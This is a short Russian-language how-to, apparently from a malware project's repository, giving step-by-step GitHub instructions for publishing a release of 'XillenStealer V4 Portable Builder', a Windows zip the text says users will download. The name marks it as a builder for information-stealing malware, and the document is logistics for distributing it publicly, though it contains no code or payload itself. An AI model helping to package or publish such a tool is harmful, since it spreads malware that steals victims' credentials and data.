ИНСТРУКЦИЯ: Как создать Release на GitHub
==========================================

У тебя уже есть:
- XillenStealer-V4-Builder-Windows.zip (101 MB)
- RELEASE_NOTES.md (текст для релиза)

ШАГ 1: Открой GitHub
---------------------
1. Перейди на: https://github.com/BengaminButton/XillenStealer
2. Нажми кнопку "Releases" (справа вверху)

ШАГ 2: Создай новый релиз
--------------------------
1. Нажми кнопку "Create a new release"
2. Tag: v4.0
3. Title: XillenStealer V4.0 - Portable Builder
4. Description: Скопируй текст из RELEASE_NOTES.md
5. Выбери "Set as the latest release"
6. НЕ ставь галочку "Set as a pre-release"

ШАГ 3: Загрузи файл
--------------------
1. Нажми "Attach binaries"
2. Выбери файл: XillenStealer-V4-Builder-Windows.zip
3. Дождись загрузки (может занять 1-2 минуты)

ШАГ 4: Опубликуй
-----------------
1. Нажми кнопку "Publish release"
2. ГОТОВО!

РЕЗУЛЬТАТ:
----------
Пользователи смогут скачать Builder прямо с GitHub:
https://github.com/BengaminButton/XillenStealer/releases/tag/v4.0
